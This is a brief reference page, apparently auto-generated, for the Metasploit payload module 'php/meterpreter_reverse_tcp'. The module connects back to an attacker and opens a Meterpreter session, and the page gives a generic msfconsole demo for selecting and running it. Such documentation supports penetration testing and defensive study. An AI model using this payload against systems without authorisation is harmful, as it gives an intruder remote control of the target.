## PHP Meterpreter, Reverse TCP Inline

Connect back to attacker and spawn a Meterpreter server 
(PHP)


## Module Name
payload/php/meterpreter_reverse_tcp

## Authors
* egypt





## Platforms
php

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/php/meterpreter_reverse_tcp
msf payload(meterpreter_reverse_tcp) > show targets
   ... a list of targets ...
msf payload(meterpreter_reverse_tcp) > set TARGET <target-id>
msf payload(meterpreter_reverse_tcp) > show options
   ... show and set options ...
msf payload(meterpreter_reverse_tcp) > run
```
    
    